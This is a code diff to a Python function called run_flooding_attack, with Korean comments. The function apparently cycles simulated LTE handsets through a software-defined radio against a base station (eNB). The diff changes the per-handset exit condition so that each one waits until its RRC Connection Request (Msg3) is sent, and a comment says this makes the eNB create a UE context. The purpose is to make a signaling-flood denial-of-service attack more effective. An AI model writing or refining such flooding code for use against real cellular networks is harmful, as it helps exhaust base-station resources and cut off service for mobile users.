@@ -221,44 +221,51 @@ def run_flooding_attack(template_config: str, usrp_args: Optional[str] = None, r
                         with open(current_log_file, 'r', encoding='utf-8', errors='ignore') as f:
                             log_content = f.read()
                         
-                        # RRC Connection Request 전송 확인 (정확히 이것만 체크)
+                        # RRC Connection Request 전송 확인 (Msg3 - 핵심!)
+                        # 실제로 eNB로 전송되었는지 확인해야 함
                         rrc_request_sent = any(keyword in log_content.lower() for keyword in [
                             'rrc connection request',
                             'sending rrc connection request',
-                            'rrc connection request sent'
+                            'rrc connection request sent',
+                            'rrcconnectionrequest',
+                            'msg3',
+                            'rrc connection request transmitted'
                         ])
                         
-                        # RACH 전송도 체크 (RRC Request 전 단계)
+                        # RAR 수신 확인 (Msg2 - RRC Request 전 단계)
+                        rar_received = any(keyword in log_content.lower() for keyword in [
+                            'rar received',
+                            'random access response',
+                            'rar',
+                            'msg2'
+                        ])
+                        
+                        # RACH 전송 확인 (Msg1 - 참고용, 종료 조건 아님)
                         rach_sent = any(keyword in log_content.lower() for keyword in [
                             'random access',
                             'rach',
                             'preamble',
-                            'sending rach'
+                            'sending rach',
+                            'msg1'
                         ])
                         
                         # PBCH 디코딩 실패 확인
                         pbch_failed = 'could not decode pbch' in log_content.lower()
                         elapsed = time.time() - process_start_time if process_start_time else 0
                         
-                        # RRC Connection Request를 보냈으면 즉시 종료 (Setup은 무시)
+                        # RRC Connection Request (Msg3) 전송 확인 - 핵심!
+                        # Msg3가 실제로 전송될 때까지 기다려야 eNB가 UE context를 생성함
                         if rrc_request_sent:
-                            # RRC Request 전송 확인 → 즉시 종료하고 다음 UE로 (대기 시간 0)
+                            # RRC Request (Msg3) 전송 확인 → eNB가 UE context 생성 후 종료
                             if current_process.poll() is None:
-                                current_process.kill()  # 즉시 kill (대기 시간 없음)
-                            logger.info(f"config_{ue_id-1} 완료")
+                                current_process.kill()  # Msg3 전송 완료 후 종료
+                            logger.info(f"config_{ue_id-1} 완료 (Msg3 전송됨)")
                             current_process = None
                             process_start_time = None
                             current_log_file = None
                             continue
-                        elif rach_sent and elapsed > 0.5:
-                            # RACH 전송 후 0.5초 지났으면 다음으로 (RRC Request가 곧 올 것)
-                            if current_process.poll() is None:
-                                current_process.kill()
-                            logger.info(f"config_{ue_id-1} 완료")
-                            current_process = None
-                            process_start_time = None
-                            current_log_file = None
-                            continue
+                        # RACH만 감지하고 RRC Request를 기다리는 중 (종료하지 않음)
+                        # RAR 수신 후 RRC Request를 기다리는 중일 수 있음
                         elif pbch_failed and elapsed > 1.0:
                             # PBCH 디코딩 실패이고 1초 이상 지났으면 다음으로
                             if current_process.poll() is None:
